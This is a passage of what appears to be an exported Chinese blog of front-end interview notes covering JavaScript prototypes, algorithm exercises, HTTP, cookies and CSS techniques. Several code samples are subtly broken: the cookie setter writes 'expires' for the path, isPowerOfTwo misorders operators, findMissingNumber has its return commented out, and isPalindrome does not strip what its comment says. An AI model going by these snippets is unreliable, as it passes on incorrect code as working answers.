测试f.printName()f.alertName()f.toString() 因为f本身没有toString()，并且f.__proto__（即Foo.prototype）中也没有toString。这个问题还是得拿出刚才那句话——当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的__proto__（即它的构造函数的prototype）中寻找。 如果在f.__proto__中没有找到toString，那么就继续去f.__proto__.__proto__中寻找，因为f.__proto__就是一个普通的对象而已嘛！… f.__proto__即Foo.prototype，没有找到toString，继续往上找 f.__proto__.__proto__即Foo.prototype.__proto__。Foo.prototype就是一个普通的对象，因此Foo.prototype.__proto__就是Object.prototype，在这里可以找到toString... 因此f.toString最终对应到了Object.prototype.toString 这样一直往上找，你会发现是一个链式的结构，所以叫做“原型链”。如果一直找到最上层都没有找到，那么就宣告失败，返回undefined。最上层是什么 —— Object.prototype.__proto__ === null 原型中的this所有从原型或更高级原型中得到、执行的方法，其中的this在执行时，就指向了当前这个触发事件执行的对象。因此printName和alertName中的this都是f。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>ES基础知识与高频考点梳理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-算法专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E7%AE%97%E6%B3%95%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[阐述下 JavaScript 中的变量提升所谓提升，顾名思义即是 JavaScript 会将所有的声明提升到当前作用域的顶部。这也就意味着我们可以在某个变量声明前就使用该变量，不过虽然 JavaScript 会将声明提升到顶部，但是并不会执行真的初始化过程。 阐述下 use strict; 的作用use strict; 顾名思义也就是 JavaScript 会在所谓严格模式下执行，其一个主要的优势在于能够强制开发者避免使用未声明的变量。对于老版本的浏览器或者执行引擎则会自动忽略该指令。 1234567// Example of strict mode"use strict";catchThemAll();function catchThemAll() &#123; x = 3.14; // Error will be thrown return x * x;&#125; 解释下什么是 Event Bubbling 以及如何避免Event Bubbling 即指某个事件不仅会触发当前元素，还会以嵌套顺序传递到父元素中。直观而言就是对于某个子元素的点击事件同样会被父元素的点击事件处理器捕获。避免 Event Bubbling 的方式可以使用event.stopPropagation() 或者 IE 9 以下使用event.cancelBubble。 == 与 === 的区别是什么=== 也就是所谓的严格比较，关键的区别在于=== 会同时比较类型与值，而不是仅比较值。 12345// Example of comparators0 == false; // true0 === false; // false2 == '2'; // true2 === '2'; // false 解释下 null 与 undefined 的区别JavaScript 中，null 是一个可以被分配的值，设置为 null 的变量意味着其无值。而 undefined 则代表着某个变量虽然声明了但是尚未进行过任何赋值。 解释下 原型继承 与 类继承 的区别在类继承中，类是不可变的，不同的语言中对于多继承的支持也不一样，有些语言中还支持接口、final、abstract 的概念。而原型继承则更为灵活，原型本身是可以可变的，并且对象可能继承自多个原型。 数组找出整型数组中乘积最大的三个数给定一个包含整数的无序数组，要求找出乘积最大的三个数。 12345678910111213141516171819var unsorted_array = [-10, 7, 29, 30, 5, -10, -70];computeProduct(unsorted_array); // 21000function sortIntegers(a, b) &#123; return a - b;&#125;// greatest product is either (min1 * min2 * max1 || max1 * max2 * max3)function computeProduct(unsorted) &#123; var sorted_array = unsorted.sort(sortIntegers), product1 = 1, product2 = 1, array_n_element = sorted_array.length - 1; // Get the product of three largest integers in sorted array for (var x = array_n_element; x &gt; array_n_element - 3; x--) &#123; product1 = product1 * sorted_array[x]; &#125; product2 = sorted_array[0] * sorted_array[1] * sorted_array[array_n_element]; if (product1 &gt; product2) return product1; return product2&#125;; 寻找连续数组中的缺失数给定某无序数组，其包含了 n 个连续数字中的 n – 1 个，已知上下边界，要求以O(n)的复杂度找出缺失的数字。 1234567891011121314151617181920// The output of the function should be 8var array_of_integers = [2, 5, 1, 4, 9, 6, 3, 7];var upper_bound = 9;var lower_bound = 1;findMissingNumber(array_of_integers, upper_bound, lower_bound); //8function findMissingNumber(array_of_integers, upper_bound, lower_bound) &#123; // Iterate through array to find the sum of the numbers var sum_of_integers = 0; for (var i = 0; i &lt; array_of_integers.length; i++) &#123; sum_of_integers += array_of_integers[i]; &#125; // 以高斯求和公式计算理论上的数组和 // Formula: [(N * (N + 1)) / 2] - [(M * (M - 1)) / 2]; // N is the upper bound and M is the lower bound upper_limit_sum = (upper_bound * (upper_bound + 1)) / 2; lower_limit_sum = (lower_bound * (lower_bound - 1)) / 2; theoretical_sum = upper_limit_sum - lower_limit_sum; // return (theoretical_sum - sum_of_integers)&#125; 数组去重给定某无序数组，要求去除数组中的重复数字并且返回新的无重复数组。 123456789101112131415161718// ES6 Implementationvar array = [1, 2, 3, 5, 1, 5, 9, 1, 2, 8];Array.from(new Set(array)); // [1, 2, 3, 5, 9, 8]// ES5 Implementationvar array = [1, 2, 3, 5, 1, 5, 9, 1, 2, 8];uniqueArray(array); // [1, 2, 3, 5, 9, 8]function uniqueArray(array) &#123; var hashmap = &#123;&#125;; var unique = []; for(var i = 0; i &lt; array.length; i++) &#123; // If key returns null (unique), it is evaluated as false. if(!hashmap.hasOwnProperty([array[i]])) &#123; hashmap[array[i]] = 1; unique.push(array[i]); &#125; &#125; return unique;&#125; 数组中元素最大差值计算给定某无序数组，求取任意两个元素之间的最大差值，注意，这里要求差值计算中较小的元素下标必须小于较大元素的下标。譬如[7, 8, 4, 9, 9, 15, 3, 1, 10]这个数组的计算值是 11( 15 – 4 ) 而不是 14(15 – 1)，因为 15 的下标小于 1。 1234567891011121314151617181920212223var array = [7, 8, 4, 9, 9, 15, 3, 1, 10];// [7, 8, 4, 9, 9, 15, 3, 1, 10] would return `11` based on the difference between `4` and `15`// Notice: It is not `14` from the difference between `15` and `1` because 15 comes before 1.findLargestDifference(array);function findLargestDifference(array) &#123; // 如果数组仅有一个元素，则直接返回 -1 if (array.length &lt;= 1) return -1; // current_min 指向当前的最小值 var current_min = array[0]; var current_max_difference = 0; // 遍历整个数组以求取当前最大差值，如果发现某个最大差值，则将新的值覆盖 current_max_difference // 同时也会追踪当前数组中的最小值，从而保证 `largest value in future` - `smallest value before it` for (var i = 1; i &lt; array.length; i++) &#123; if (array[i] &gt; current_min &amp;&amp; (array[i] - current_min &gt; current_max_difference)) &#123; current_max_difference = array[i] - current_min; &#125; else if (array[i] &lt;= current_min) &#123; current_min = array[i]; &#125; &#125; // If negative or 0, there is no largest difference if (current_max_difference &lt;= 0) return -1; return current_max_difference;&#125; 数组中元素乘积给定某无序数组，要求返回新数组 output ，其中 output[i] 为原数组中除了下标为 i 的元素之外的元素乘积，要求以 O(n) 复杂度实现： 123456789101112131415161718192021222324252627var firstArray = [2, 2, 4, 1];var secondArray = [0, 0, 0, 2];var thirdArray = [-2, -2, -3, 2];productExceptSelf(firstArray); // [8, 8, 4, 16]productExceptSelf(secondArray); // [0, 0, 0, 0]productExceptSelf(thirdArray); // [12, 12, 8, -12]function productExceptSelf(numArray) &#123; var product = 1; var size = numArray.length; var output = []; // From first array: [1, 2, 4, 16] // The last number in this case is already in the right spot (allows for us) // to just multiply by 1 in the next step. // This step essentially gets the product to the left of the index at index + 1 for (var x = 0; x &lt; size; x++) &#123; output.push(product); product = product * numArray[x]; &#125; // From the back, we multiply the current output element (which represents the product // on the left of the index, and multiplies it by the product on the right of the element) var product = 1; for (var i = size - 1; i &gt; -1; i--) &#123; output[i] = output[i] * product; product = product * numArray[i]; &#125; return output;&#125; 数组交集给定两个数组，要求求出两个数组的交集，注意，交集中的元素应该是唯一的。 12345678910111213141516171819202122var firstArray = [2, 2, 4, 1];var secondArray = [1, 2, 0, 2];intersection(firstArray, secondArray); // [2, 1]function intersection(firstArray, secondArray) &#123; // The logic here is to create a hashmap with the elements of the firstArray as the keys. // After that, you can use the hashmap's O(1) look up time to check if the element exists in the hash // If it does exist, add that element to the new array. var hashmap = &#123;&#125;; var intersectionArray = []; firstArray.forEach(function(element) &#123; hashmap[element] = 1; &#125;); // Since we only want to push unique elements in our case... we can implement a counter to keep track of what we already added secondArray.forEach(function(element) &#123; if (hashmap[element] === 1) &#123; intersectionArray.push(element); hashmap[element]++; &#125; &#125;); return intersectionArray; // Time complexity O(n), Space complexity O(n)&#125; 字符串颠倒字符串给定某个字符串，要求将其中单词倒转之后然后输出，譬如”Welcome to this Javascript Guide!” 应该输出为 “emocleW ot siht tpircsavaJ !ediuG”。 12345678var string = "Welcome to this Javascript Guide!";// Output becomes !ediuG tpircsavaJ siht ot emocleWvar reverseEntireSentence = reverseBySeparator(string, "");// Output becomes emocleW ot siht tpircsavaJ !ediuGvar reverseEachWord = reverseBySeparator(reverseEntireSentence, " ");function reverseBySeparator(string, separator) &#123; return string.split(separator).reverse().join(separator);&#125; 乱序同字母字符串给定两个字符串，判断是否颠倒字母而成的字符串，譬如Mary与Army就是同字母而顺序颠倒： 123456789101112var firstWord = "Mary";var secondWord = "Army";isAnagram(firstWord, secondWord); // truefunction isAnagram(first, second) &#123; // For case insensitivity, change both words to lowercase. var a = first.toLowerCase(); var b = second.toLowerCase(); // Sort the strings, and join the resulting array to a string. Compare the results a = a.split("").sort().join(""); b = b.split("").sort().join(""); return a === b;&#125; 会问字符串判断某个字符串是否为回文字符串，譬如racecar与race car都是回文字符串： 12345678isPalindrome("racecar"); // trueisPalindrome("race Car"); // truefunction isPalindrome(word) &#123; // Replace all non-letter chars with "" and change to lowercase var lettersOnly = word.toLowerCase().replace(/\s/g, ""); // Compare the string with the reversed version of the string return lettersOnly === lettersOnly.split("").reverse().join("");&#125; 栈与队列使用两个栈实现入队与出队123456789101112131415161718var inputStack = []; // First stackvar outputStack = []; // Second stack// For enqueue, just push the item into the first stackfunction enqueue(stackInput, item) &#123; return stackInput.push(item);&#125;function dequeue(stackInput, stackOutput) &#123; // Reverse the stack such that the first element of the output stack is the // last element of the input stack. After that, pop the top of the output to // get the first element that was ever pushed into the input stack if (stackOutput.length &lt;= 0) &#123; while(stackInput.length &gt; 0) &#123; var elementToOutput = stackInput.pop(); stackOutput.push(elementToOutput); &#125; &#125; return stackOutput.pop();&#125; 判断大括号是否闭合创建一个函数来判断给定的表达式中的大括号是否闭合： 1234567891011121314151617181920212223242526var expression = "&#123;&#123;&#125;&#125;&#123;&#125;&#123;&#125;"var expressionFalse = "&#123;&#125;&#123;&#123;&#125;";isBalanced(expression); // trueisBalanced(expressionFalse); // falseisBalanced(""); // truefunction isBalanced(expression) &#123; var checkString = expression; var stack = []; // If empty, parentheses are technically balanced if (checkString.length &lt;= 0) return true; for (var i = 0; i &lt; checkString.length; i++) &#123; if(checkString[i] === '&#123;') &#123; stack.push(checkString[i]); &#125; else if (checkString[i] === '&#125;') &#123; // Pop on an empty array is undefined if (stack.length &gt; 0) &#123; stack.pop(); &#125; else &#123; return false; &#125; &#125; &#125; // If the array is not empty, it is not balanced if (stack.pop()) return false; return true;&#125; 递归二进制转换通过某个递归函数将输入的数字转化为二进制字符串： 123456789101112131415161718decimalToBinary(3); // 11decimalToBinary(8); // 1000decimalToBinary(1000); // 1111101000function decimalToBinary(digit) &#123; if(digit &gt;= 1) &#123; // If digit is not divisible by 2 then recursively return proceeding // binary of the digit minus 1, 1 is added for the leftover 1 digit if (digit % 2) &#123; return decimalToBinary((digit - 1) / 2) + 1; &#125; else &#123; // Recursively return proceeding binary digits return decimalToBinary(digit / 2) + 0; &#125; &#125; else &#123; // Exit condition return ''; &#125;&#125; 二分搜索123456789101112function recursiveBinarySearch(array, value, leftPosition, rightPosition) &#123; // Value DNE if (leftPosition &gt; rightPosition) return -1; var middlePivot = Math.floor((leftPosition + rightPosition) / 2); if (array[middlePivot] === value) &#123; return middlePivot; &#125; else if (array[middlePivot] &gt; value) &#123; return recursiveBinarySearch(array, value, leftPosition, middlePivot - 1); &#125; else &#123; return recursiveBinarySearch(array, value, middlePivot + 1, rightPosition); &#125;&#125; 数字判断是否为 2 的指数值123456789101112131415161718192021isPowerOfTwo(4); // trueisPowerOfTwo(64); // trueisPowerOfTwo(1); // trueisPowerOfTwo(0); // falseisPowerOfTwo(-1); // false// For the non-zero case:function isPowerOfTwo(number) &#123; // `&amp;` uses the bitwise n. // In the case of number = 4; the expression would be identical to: // `return (4 &amp; 3 === 0)` // In bitwise, 4 is 100, and 3 is 011. Using &amp;, if two values at the same // spot is 1, then result is 1, else 0. In this case, it would return 000, // and thus, 4 satisfies are expression. // In turn, if the expression is `return (5 &amp; 4 === 0)`, it would be false // since it returns 101 &amp; 100 = 100 (NOT === 0) return number &amp; (number - 1) === 0;&#125;// For zero-case:function isPowerOfTwoZeroCase(number) &#123; return (number !== 0) &amp;&amp; ((number &amp; (number - 1)) === 0);&#125;]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-网络专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E7%BD%91%E7%BB%9C%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[HTTP状态码知道哪些？ 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 附上思维导图： JS数组去重12345678910111213141516171819202122232425262728293031323334Array.prototype.unique1 = function() &#123; var n = []; //一个新的临时数组 for(var i = 0; i &lt; this.length; i++) //遍历当前数组 &#123; //如果当前数组的第i已经保存进了临时数组，那么跳过， //否则把当前项push到临时数组里面 if(n.indexOf(this[i]) == -1) n.push(this[i]); &#125; return n;&#125;Array.prototype.unique2 = function() &#123; var n = &#123;&#125;, r = []; //n为hash表，r为临时数组 for(var i = 0; i &lt; this.length; i++) //遍历当前数组 &#123; if(!n[this[i]]) //如果hash表中没有当前项 &#123; n[this[i]] = true; //存入hash表 r.push(this[i]); //把当前数组的当前项push到临时数组里面 &#125; &#125; return r;&#125;Array.prototype.unique3 = function() &#123; var n = [this[0]]; //结果数组 for(var i = 1; i &lt; this.length; i++) //从第二项开始遍历 &#123; //如果当前数组的第i项在当前数组中第一次出现的位置不是i， //那么表示第i项是重复的，忽略掉。否则存入结果数组 if(this.indexOf(this[i]) == i) n.push(this[i]); &#125; return n;&#125; js操作获取和设置cookie12345678910111213141516171819202122232425262728293031323334353637//创建cookiefunction setCookie(name, value, expires, path, domain, secure) &#123; var cookieText = encodeURIComponent(name) + '=' + encodeURIComponent(value); if (expires instanceof Date) &#123; cookieText += '; expires=' + expires; &#125; if (path) &#123; cookieText += '; expires=' + expires; &#125; if (domain) &#123; cookieText += '; domain=' + domain; &#125; if (secure) &#123; cookieText += '; secure'; &#125; document.cookie = cookieText;&#125;//获取cookiefunction getCookie(name) &#123; var cookieName = encodeURIComponent(name) + '='; var cookieStart = document.cookie.indexOf(cookieName); var cookieValue = null; if (cookieStart &gt; -1) &#123; var cookieEnd = document.cookie.indexOf(';', cookieStart); if (cookieEnd == -1) &#123; cookieEnd = document.cookie.length; &#125; cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)); &#125; return cookieValue;&#125;//删除cookiefunction unsetCookie(name) &#123; document.cookie = name + "= ; expires=" + new Date(0);&#125; ajax 有那些优缺点?如何解决跨域问题?优点：-（1）通过异步模式，提升了用户体验.-（2）优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用.-（3）Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。-（4）Ajax可以实现动态不刷新（局部刷新） 缺点：-（1）安全问题 AJAX暴露了与服务器交互的细节。-（2）对搜索引擎的支持比较弱。-（3）不容易调试。 jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面。GET和POST的区别，何时使用POST？GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符POST：一般用于修改服务器上的资源，对所发送的信息没有限制。GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值，也就是说Get是通过地址栏来传值，而Post是通过提交表单来传值。 然而，在以下情况中，请使用 POST 请求： 无法使用缓存文件（更新服务器上的文件或数据库） 向服务器发送大量数据（POST 没有数据量限制） 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠 线程与进程的区别 一个程序至少有一个进程,一个进程至少有一个线程. 线程的划分尺度小于进程，使得多线程程序的并发性高。 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ （1）查找浏览器缓存 （2）DNS解析、查找该域名对应的IP地址、重定向- （301）、发出第二个GET请求 （3）进行HTTP协议会话 （4）客户端发送报头(请求报头) （5）服务器回馈报头(响应报头) （6）html文档开始下载 （7）文档树建立，根据标记请求所需指定MIME类型的文件 （8）文件显示]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>网络专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-浏览器专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[介绍一下你对浏览器内核的理解？主要分成两部分： 渲染引擎(layout engineer或Rendering Engine) 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎。 JS引擎则：解析和执行javascript来实现网页的动态效果。 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。 请解释一下 JavaScript 的同源策略概念：同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。 同源策略指什么？这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。指一段脚本只能读取来自同一来源的窗口和文档的属性。 为什么要有同源限制？我们举例说明：比如一个黑客程序，他利用iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>浏览器专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-CSS专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-CSS%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[请解释一下为什么需要清除浮动?清除浮动有哪些方式？比较好的方式是哪一种？清除浮动是为了清除使用浮动元素产生的影响。浮动的元素，高度会塌陷，而高度的塌陷使我们页面后面的布局不能正常显示。 父级div定义height。 结尾处加空div标签clear:both。 父级div定义伪类:after和zoom。 父级div定义overflow:hidden。 父级div定义overflow:auto。 父级div也浮动，需要定义宽度。 父级div定义display:table。 结尾处加br标签clear:both。 比较好的是第3种方式，好多网站都这么用。 原理： 1) display:block 使生成的元素以块级元素显示,占满剩余空间; 2) height:0 避免生成内容破坏原有布局的高度。 3) visibility:hidden 使生成的内容不可见，并允许可能被生成内容盖住的内容可以进行点击和交互; 4）通过 content:”.”生成内容作为最后一个元素，至于content里面是点还是其他都是可以的，例如oocss里面就有经典的 content:”.”,有些版本可能content 里面内容为空,一丝冰凉是不推荐这样做的,firefox直到7.0 content:”” 仍然会产生额外的空隙； 5）zoom：1 触发IE hasLayout。 通过分析发现，除了clear：both用来闭合浮动的，其他代码无非都是为了隐藏掉content生成的内容，这也就是其他版本的闭合浮动为什么会有font-size：0，line-height：0。 zoom:1的清除浮动原理? 清除浮动，触发hasLayout； Zoom属性是IE浏览器的专有属性，它可以设置或检索对象的缩放比例。解决ie下比较奇葩的bug。 譬如外边距（margin）的重叠，浮动清除，触发ie的haslayout属性等。 来龙去脉大概如下： 当设置了zoom的值之后，所设置的元素就会就会扩大或者缩小，高度宽度就会重新计算了，这里一旦改变zoom值时其实也会发生重新渲染，运用这个原理，也就解决了ie下子元素浮动时候父元素不随着自动扩大的问题。 Zoom属是IE浏览器的专有属性，火狐和老版本的webkit核心的浏览器都不支持这个属性。然而，zoom现在已经被逐步标准化，出现在 CSS 3.0 规范草案中。 目前非ie由于不支持这个属性，它们又是通过什么属性来实现元素的缩放呢？ 可以通过css3里面的动画属性scale进行缩放。 box-sizing常用的属性有哪些？分别有什么作用？ box-sizing: content-box|border-box|inherit; content-box:宽度和高度分别应用到元素的内容框。在宽度和高度之外绘制元素的内边距和边框(元素默认效果)。 border-box:元素指定的任何内边距和边框都将在已设定的宽度和高度内进行绘制。通过从已设定的宽度和高度分别减去边框和内边距才能得到内容的宽度和高度。 页面导入样式时，使用link和@import有什么区别？ link属于XHTML标签，除了加载CSS外，还能用于定义RSS, 定义rel连接属性等作用；而@import是CSS提供的，只能用于加载CSS; 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载; import是CSS2.1 提出的，只在IE5以上才能被识别，而link是XHTML标签，无兼容问题; 介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？-（1）有两种， IE 盒子模型、W3C 盒子模型。-（2）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)。-（3）区 别： IE的content部分把 border 和 padding计算了进去。 CSS优先级算法如何计算？ 优先级就近原则，同权重情况下样式定义最近者为准; 载入样式以最后载入的定位为准; 优先级为: !important &gt; id &gt; class &gt; tag important比内联优先级高(style) 为什么要使用CSS spritesCSS Sprites其实就是把网页中一些背景图片整合到一张图片文件中，再利用CSS的“background-image”，“background-position”的组合进行背景定位，这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是如果请求太多会给服务器增加很大的压力。 display:none和visibility:hidden的区别？ display:none 隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。 visibility:hidden 隐藏对应的元素，但是在文档布局中仍保留原来的空间。 position的absolute与fixed区别 absolute浮动定位是相对于父级中设置position为relative或者absolute最近的父级元素 fixed浮动定位是相对于浏览器视窗的 position的值relative和absolute定位原点是？ absolute 生成绝对定位的元素，相对于值不为 static的第一个父元素进行定位。 fixed （老IE不支持） 生成绝对定位的元素，相对于浏览器窗口进行定位。 relative 生成相对定位的元素，相对于其正常位置进行定位。 static 默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right z-index 声明）。 inherit规定从父元素继承 position 属性的值。 IE 8以下版本的浏览器中的盒模型有什么不同？IE8以下浏览器的盒模型中定义的元素的宽高包括内边距和边框（怪异盒子模型） CSS3新增伪类有那些？举例： p:first-of-type 选择属于其父元素的首个 元素的每个 元素。 p:last-of-type 选择属于其父元素的最后 元素的每个 元素。 p:only-of-type 选择属于其父元素唯一的 元素的每个 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 元素。 ::after 在元素之前添加内容,也可以用来做清除浮动。 ::before 在元素之后添加内容 :enabled :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中。 如何居中div？ 水平居中：给div设置一个宽度，然后添加margin:0 auto属性 1234div&#123; width:200px; margin:0 auto; &#125; 让绝对定位的div居中 1234567891011div &#123; position: absolute; width: 300px; height: 300px; margin: auto; top: 0; left: 0; bottom: 0; right: 0; background-color: pink; /* 方便看效果 */&#125; 水平垂直居中一 123456789101112确定容器的宽高 宽500 高 300 的层设置层的外边距div &#123; position: relative; /* 相对定位或绝对定位均可 */ width:500px; height:300px; top: 50%; left: 50%; margin: -150px 0 0 -250px; /* 外边距为自身宽高的一半 */ background-color: pink; /* 方便看效果 */&#125; 水平垂直居中二 1234567891011未知容器的宽高，利用 `transform` 属性div &#123; position: absolute; /* 相对定位或绝对定位均可 */ width:500px; height:300px; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: pink; /* 方便看效果 */&#125; 水平垂直居中三 123456789101112 利用 flex 布局 实际使用时应考虑兼容性.container &#123; display: flex; align-items: center; /* 垂直居中 */ justify-content: center; /* 水平居中 */&#125;.container div &#123; width: 100px; height: 100px; background-color: pink; /* 方便看效果 */&#125; display有哪些值？说明他们的作用。 block 块类型。默认宽度为父元素宽度，可设置宽高，换行显示。 none 元素不显示，并从文档流中移除。 inline 行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示。 inline-block 默认宽度为内容宽度，可以设置宽高，同行显示。 list-item 象块类型元素一样显示，并添加样式列表标记。 table 此元素会作为块级表格来显示。 inherit 规定应该从父元素继承 display 属性的值。 CSS3有哪些新特性？新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点） 圆角 （border-radius:8px） 多列布局 （multi-column layout） 阴影和反射 （Shadow\Reflect） 文字特效 （text-shadow、） 文字渲染 （Text-decoration） 线性渐变 （gradient） 旋转 （transform） 缩放,定位,倾斜,动画,多背景例如:transform:\scale(0.85,0.90)\ translate(0px,-30px)\ skew(-9deg,0deg)\Animation: 请解释一下CSS3的Flexbox（弹性盒布局模型）,以及适用场景？一个用于页面布局的全新CSS3功能，Flexbox可以把列表放在同一个方向（从上到下排列，从左到右），并让列表能延伸到占用可用的空间。较为复杂的布局还可以通过嵌套一个伸缩容器（flex container）来实现。采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。常规布局是基于块和内联流方向，而Flex布局是基于flex-flow流可以很方便的用来做局中，能对不同屏幕大小自适应。在布局上有了比以前更加灵活的空间。具体：http://www.w3cplus.com/css3/flexbox-basics.html 用纯CSS创建一个三角形的原理是什么？ 把上、左、右三条边隐藏掉（颜色设为 transparent） 1234567#demo &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparent transparent red transparent;&#125; 一个满屏 品 字布局 如何设计?简单的方式： 上面的div宽100%， 下面的两个div分别宽50%， 然后用float或者inline使其不换行即可 css多列等高如何实现？利用padding-bottom|margin-bottom正负值相抵；设置父容器设置超出隐藏（overflow:hidden），这样子父容器的高度就还是它里面的列没有设定padding-bottom时的高度，当它里面的任 一列高度增加了，则父容器的高度被撑到里面最高那列的高度，其他比这列矮的列会用它们的padding-bottom补偿这部分高度差。 经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧 ？ png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8. 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一。 IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。 浮动ie产生的双倍距离 #box{ float:left; width:10px; margin:0 0 0 100px;} 这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入 ——display:inline;将其转化为行内属性。(这个符号只有ie6会识别) 渐进识别的方式，从总体中逐渐排除局部。 首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。 接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。 123456.bb&#123; background-color:red;/*所有识别*/ background-color:#00deff\9; /*IE6、7、8识别*/ +background-color:#a200ff;/*IE6、7识别*/ _background-color:#1e0bd1;/*IE6识别*/&#125; IE下,可以使用获取常规属性的方法来获取自定义属性,也可以使用getAttribute()获取自定义属性;Firefox下,只能使用getAttribute()获取自定义属性。解决方法:统一通过getAttribute()获取自定义属性。 IE下,even对象有x,y属性,但是没有pageX,pageY属性;Firefox下,event对象有pageX,pageY属性,但是没有x,y属性。 解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。 Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示,可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决。 超链接访问过后hover样式就不出现了 被点击访问过的超链接样式不在具有hover和active了解决方法是改变CSS属性的排列顺序:L-V-H-A : a:link {} a:visited {} a:hover {} a:active {} li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？行框的排列会受到中间空白（回车\空格）等的影响，因为空格也属于字符,这些空白也会被应用样式，占据空间，所以会有间隔，把字符大小设为0，就没有空格了。 为什么要初始化CSS样式。 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 最简单的初始化方法： * {padding: 0; margin: 0;} （强烈不建议） 淘宝的样式初始化代码： 123456789101112131415body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td &#123; margin:0; padding:0; &#125;body, button, input, select, textarea &#123; font:12px/1.5tahoma, arial, \5b8b\4f53; &#125;h1, h2, h3, h4, h5, 